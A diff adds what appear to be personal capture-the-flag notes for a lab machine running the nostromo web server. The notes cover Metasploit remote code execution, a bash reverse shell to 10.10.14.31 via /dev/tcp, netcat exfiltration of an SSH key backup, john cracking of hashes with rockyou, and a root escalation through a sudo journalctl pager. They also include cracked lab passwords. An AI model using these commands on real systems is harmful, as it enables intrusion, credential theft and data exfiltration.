@@ -1,0 +1,26 @@
+//Based on TRX's writeup
+//On nmap found /usr/bin/../share/nmap that gave nostromo 1.9.6, it has vul in metasploit for RCE multi/http/nostromo_code_exec. Got Shell
+nc -lvnp 9001
+bash -c 'bash -i >& /dev/tcp/10.10.14.31/9001 0>&1'	//to get a better shell
+
+/var/nostromo/conf/.htpasswd
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+david:Nowonly4me	//this pass is not useful or so it seems
+
+find / -type f -newermt 2019-10-24 ! -newermt 2019-10-27 2>/dev/null
+//nhttpd.conf has the route public_www that is accesible though david's home is not
+nc -lvp 1234 > backup.tgz
+nc 10.10.14.31 1234 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
+tar -xvf backup.tgz
+//got id_rsa and it's pub, but needs pass to ssh
+python ssh2john.py id_rsa > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+ssh -i id_rsa david@10.10.10.165	//got shell as david and user.txt
+david:hunter
+
+//PrivEsc
+//home has server-stats.sh, with the following line:
+/usr/bin/sudo /usr/bin/journalclt -n5 -unostromo.service | /usr/bin/cat
+./server-stats.sh	//shows 5 lines of nostromo using journalctl, which uses less and less waits for input, so it can be exploited running a shell command:
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+!/bin/bash		//write the command in the less output and got root
